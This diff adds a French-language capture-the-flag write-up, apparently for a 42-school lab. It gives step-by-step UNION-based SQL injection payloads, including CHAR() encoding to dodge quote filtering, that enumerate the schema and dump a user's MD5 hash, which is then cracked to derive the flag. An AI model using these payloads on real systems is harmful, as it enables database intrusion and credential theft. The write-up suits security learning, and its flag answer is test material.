@@ -1,0 +1,11 @@
+il faut faire une injection SQL. step by step
+1. 0=0 -> renvoie 4 user avec first et surname dont un Flag, GetThe
+2. 0=0 UNION SELECT database(), null-- -> dans le champ First name: Member_Sql_Injection
+3. 0=0 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)--
+apres multiple tentative on a encoder Member_Sql_Injection en une liste de char ce qui a fonctionner et nous donne First name: users le nom de la table_name
+4. 0=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115) AND table_schema=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)--
+ce qui nous donne les colonnes de la table users [user_id, first_name, last_name, town, country, planet, Commentaire, countersign]
+5. 0=0 UNION SELECT first_name, [any-colonne] From users--
+on le fait pour chaque colonne du user suspect: [user_id = 5, first_name = Flag, last_name = GetThe, town = 42, country = 42, planet = 42, Commentaire = Decrypt this password -> then lower all the char. Sh256 on it and it's good !, countersign = 5ff9d0165b4f92b14994e5c685cdce28]
+6. 5ff9d0165b4f92b14994e5c685cdce28 est un hash md5, on le dechiffre sur https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28 ce qui nous donne: FortyTwo
+7. FortyTwo en minuscule -> fortytwo -> on le hash en sha256 ce qui nous donne: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
